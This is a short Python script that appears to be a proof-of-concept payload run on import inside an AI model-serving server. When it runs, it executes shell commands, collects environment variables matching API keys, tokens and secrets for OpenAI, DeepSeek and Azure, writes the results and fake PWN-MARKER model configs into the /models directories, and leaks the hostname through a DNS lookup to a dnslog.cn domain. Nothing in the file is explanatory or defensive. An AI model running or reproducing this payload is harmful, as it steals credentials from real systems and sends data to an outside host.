import os, subprocess, base64, sys
def _run():
    try:
        r = subprocess.check_output("echo PWN_MARKER_$(hostname); id; ls /models/ 2>/dev/null | head -10; ls /build/models/ 2>/dev/null | head -10; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure' | head -30", shell=True, stderr=subprocess.STDOUT, timeout=15)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写 marker 到 /models/ (yaml 模型配置 - watcher 会扫描)
    try:
        with open("/models/PWN-MARKER.yaml", "w") as f:
            f.write("name: PWN-MARKER\nbackend: llama-cpp\nmodel: /models/dummy.gguf\n")
    except: pass
    try:
        with open("/build/models/PWN-MARKER.yaml", "w") as f:
            f.write("name: PWN-MARKER\nbackend: llama-cpp\nmodel: /models/dummy.gguf\n")
    except: pass
    # 写结果
    for p in ["/models/PWNED-RESULT.txt", "/tmp/PWNED-RESULT.txt", "/build/models/PWNED-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 快速 DNS 外带 (仅主机名, 短超时)
    try:
        import socket
        socket.setdefaulttimeout(3)
        host = open("/etc/hostname").read().strip()[:40] if os.path.exists("/etc/hostname") else "x"
        socket.gethostbyname(host.replace(".","-") + ".hc92gc.dnslog.cn")
    except: pass
_run()
